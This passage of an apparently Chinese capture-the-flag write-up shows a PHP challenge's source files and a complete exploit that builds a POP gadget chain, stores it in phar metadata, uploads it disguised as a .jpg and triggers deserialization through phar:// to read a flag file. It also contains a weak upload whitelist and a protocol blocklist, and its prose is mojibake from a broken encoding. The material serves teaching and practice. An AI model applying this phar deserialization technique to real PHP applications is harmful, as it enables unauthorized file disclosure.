class="hljs-comment">#class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>        &#125;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#file.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>; <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html/&#x27;</span>); <br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-string">&quot;&quot;</span>; <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; <br>&#125; <br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(); <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-variable">$show</span>-&gt;source = <span class="hljs-variable">$file</span>; <br>    <span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">_show</span>(); <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>))&#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#upload.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//show_source(__FILE__);</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;base.php&quot;</span>;<span class="hljs-comment">#æ²¡ä»€ä¹ˆç”¨æœ€ååªæ˜¯è°ƒç”¨äº†upload_fileæ–¹æ³•ã€‚</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_do</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]).<span class="hljs-string">&quot;.jpg&quot;</span>;<br>    <span class="hljs-comment">//mkdir(&quot;upload&quot;,0777);</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">upload_file_check</span>()) &#123;<br>        <span class="hljs-title function_ invoke__">upload_file_do</span>();<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_check</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>;<br>    <span class="hljs-variable">$allowed_types</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>);<br>    <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$temp</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$extension</span>)) &#123;<br>        <span class="hljs-comment">//echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;;</span><br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>,<span class="hljs-variable">$allowed_types</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¿«é€Ÿä»‹ç»ä¸‹ï¼šå…ˆä¸Šä¼ æ–‡ä»¶åœ¨é€šè¿‡pharåè®®å³å¯æ‹¿åˆ°flagï¼Œupload.phpä¸Šä¼ çš„æ–‡ä»¶(ç™½åå•)ä¼šç»è¿‡ä¿®æ”¹åå­—ï¼Œä¸Šä¼ åˆ°uploadçš„ç›®å½•ï¼Œå¹³ä¸”åç¼€åªä¸º.jpgï¼ˆæ–‡ä»¶åçš„è¯å¯ä»¥è®¿é—®uploadå°±å¯ä»¥ç°å®æ–‡ä»¶åï¼Œæ–‡ä»¶åä¹Ÿå¯ä»¥è‡ªå·±ç®—å‡ºæ¥æ²¡æ‡‚ä¸ºå¦‚ä½•ç®—ï¼‰ï¼Œç„¶ååœ¨file.phpä¸­ç”¨pharåè®®è¯»å–ä¸Šä¼ æ–‡ä»¶ï¼Œå…³é”®åœ¨äºå¦‚ä½•åœ¨class.phpæ„é€ popé“¾</p><p>å¿«é€Ÿæ¥å—popé“¾å¦‚ä½•æ„æˆï¼š</p><p>Testï¼šï¼šfile_get()&lt;â€“Testï¼šï¼šget()&lt;â€“Testï¼šï¼š__get()&lt;â€“Showï¼šï¼š<code>__toString()</code>&lt;â€“C1e4rï¼šï¼š<code>__destruct()</code></p><h5 id="æ³¨æ„ï¼š-1"><a href="#æ³¨æ„ï¼š-1" class="headerlink" title="æ³¨æ„ï¼š"></a>æ³¨æ„ï¼š</h5><p>æ²¡æƒ³åˆ°pharåè®®å¯ä»¥è§£æ.jpgåç¼€è¯´æ˜ï¼Œpharä¸æ˜¯é€šè¿‡åç¼€åˆ¤æ–­ï¼Œå¯èƒ½æ˜¯é€šè¿‡å†…å®¹</p><p>å®Œæ•´expï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;       <span class="hljs-comment">//  3  èµ‹å€¼ä¸ºShowç±»å¯¹è±¡</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;        <span class="hljs-comment">//  2 strä¸­çš„é”®åstrèµ‹å€¼ä¸ºTestç±»å¯¹è±¡</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;     <span class="hljs-comment">// 1  èµ‹å€¼ä¸º[&#x27;source&#x27; =&gt; &#x27;/var/www/html/f1ag.php&#x27;]</span><br>&#125;<br> <br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>;<br><span class="hljs-variable">$a</span>-&gt;params=[<span class="hljs-string">&#x27;source&#x27;</span>=&gt;<span class="hljs-string">&#x27;/var/www/html/f1ag.php&#x27;</span>];<br><span class="hljs-comment">//å¦‚æœç›´æ¥èµ‹å€¼ä¸ºf1ag.phpæ²¡æœ‰ä½œç”¨</span><br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br><span class="hljs-variable">$b</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-variable">$a</span>;<br><span class="hljs-comment">//ä¹Ÿå¯ä»¥$b-&gt;str=[&#x27;str&#x27;=&gt;$a];</span><br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>;<br><span class="hljs-variable">$c</span>-&gt;str=<span class="hljs-variable">$b</span>;<br><br><span class="hljs-keyword">or</span><br>    <br><span class="hljs-variable">$m</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>();<br><span class="hljs-variable">$m</span>-&gt;str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$m</span>-&gt;str-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$m</span>-&gt;str-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;params[<span class="hljs-string">&quot;source&quot;</span>]=<span class="hljs-string">&quot;/var/www/html/f1ag.php&quot;</span>;<br> <br><span class="hljs-comment">//å‰é¢æ˜¯æ„é€ çš„åºåˆ—åŒ–å­—ç¬¦ä¸²,åé¢æ˜¯ç”Ÿæˆpharæ–‡ä»¶</span><br> <br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//åç¼€åå¿…é¡»ä¸ºphar,å‰é¢åç§°éšæ„</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//è®¾ç½®stub</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$c</span>); <span class="hljs-comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br><span class="hljs-comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
